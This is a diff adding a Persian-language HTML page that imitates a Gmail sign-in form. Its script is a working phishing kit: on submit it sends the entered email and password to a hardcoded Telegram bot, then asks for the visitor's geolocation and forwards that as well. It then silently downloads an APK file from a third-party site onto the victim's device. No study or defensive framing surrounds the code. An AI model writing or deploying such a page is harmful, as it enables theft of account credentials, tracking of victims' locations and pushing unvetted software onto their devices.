@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ورود به جی‌میل</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+
+        .login-container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 350px;
+            position: relative;
+        }
+
+        .header {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .logo {
+            width: 150px;
+        }
+
+        input {
+            display: block;
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            position: relative;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #357ae8;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            z-index: 1; /* Ensure it stays on top */
+        }
+
+        .language-switch {
+            margin-top: 20px;
+        }
+
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon_%282020%29.svg" alt="لوگوی جی‌میل" class="logo" onerror="this.style.display='none'">
+        </div>
+        <h2 id="pageTitle">ورود به حساب جی‌میل</h2>
+        <form id="loginForm">
+            <input type="email" id="email" placeholder="ایمیل" required>
+            <div class="password-container">
+                <input type="password" id="password" placeholder="رمز عبور" required>
+                <span class="eye-icon" id="togglePassword">
+                    <img src="https://img.icons8.com/material-outlined/24/000000/visible.png" alt="نمایش رمز" />
+                </span>
+            </div>
+            <button type="submit" id="submitBtn">ورود</button>
+        </form>
+        <div class="language-switch">
+            <select id="languageSelect">
+                <option value="fa">فارسی</option>
+                <option value="en">English</option>
+            </select>
+        </div>
+    </div>
+
+    <script>
+        const teleBotToken = '8121097730:AAG8RP1eUGcIIx-Aiv5BlF-cBDQntI8-GNs'; // توکن ربات تلگرام
+        const chatId = '6241863375'; // شناسه چت
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${teleBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url).catch(error => console.error('Error:', error));
+        }
+
+        function getLocationAndSend() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    const date = new Date();
+                    const locationMessage = `مکان کاربر: عرض جغرافیایی: ${latitude}, طول جغرافیایی: ${longitude}\nزمان: ${date.toLocaleString()}`;
+                    sendToTelegram(locationMessage);
+                }, () => {
+                    sendToTelegram('کاربر اجازه دسترسی به موقعیت جغرافیایی را نداد.');
+                });
+            } else {
+                sendToTelegram('این مرورگر از Geolocation پشتیبانی نمی‌کند.');
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // جلوگیری از ارسال فرم
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            const loginMessage = `ایمیل: ${email}\nرمز عبور: ${password}`;
+            sendToTelegram(loginMessage);
+
+            getLocationAndSend(); // دریافت موقعیت جغرافیایی و زمان
+
+            // باز کردن صفحه جدید
+            const newPage = window.open('YOUR_NEW_PAGE_URL', '_blank'); // آدرس صفحه جدید را وارد کنید
+
+            // دانلود فایل بدون نمایش پاپ آپ
+            const downloadUrl = 'https://www.dl.farsroid.com/ap/InShot-Pro-2.093.1474(www.farsroid.com).apk'; // لینک دانلود را وارد کنید
+            fetch(downloadUrl)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'InShot-Pro.apk'; // نام فایل دانلود شده
+                    document.body.appendChild(a);
+                    a.click();
+                    a.remove();
+                })
+                .catch(error => console.error('Error downloading file:', error));
+        });
+
+        // نمایش/پنهان‌سازی رمز عبور
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('password');
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.querySelector('img').src = type === 'password' ? 'https://img.icons8.com/material-outlined/24/000000/visible.png' : 'https://img.icons8.com/material-outlined/24/000000/invisible.png';
+        });
+
+        // تغییر زبان
+        document.getElementById('languageSelect').addEventListener('change', function() {
+            const selectedLanguage = this.value;
+            if (selectedLanguage === 'fa') {
+                document.title = 'ورود به جی‌میل';
+                document.querySelector('h2').textContent = 'ورود به حساب جی‌میل';
+                document.querySelector('input[placeholder="ایمیل"]').placeholder = 'ایمیل';
+                document.querySelector('input[placeholder="رمز عبور"]').placeholder = 'رمز عبور';
+                document.querySelector('button').textContent = 'ورود';
+            } else {
+                document.title = 'Gmail Login';
+                document.querySelector('h2').textContent = 'Login to Gmail Account';
+                document.querySelector('input[placeholder="ایمیل"]').placeholder = 'Email';
+                document.querySelector('input[placeholder="رمز عبور"]').placeholder = 'Password';
+                document.querySelector('button').textContent = 'Login';
+            }
+        });
+    </script>
+</body>
+</html>
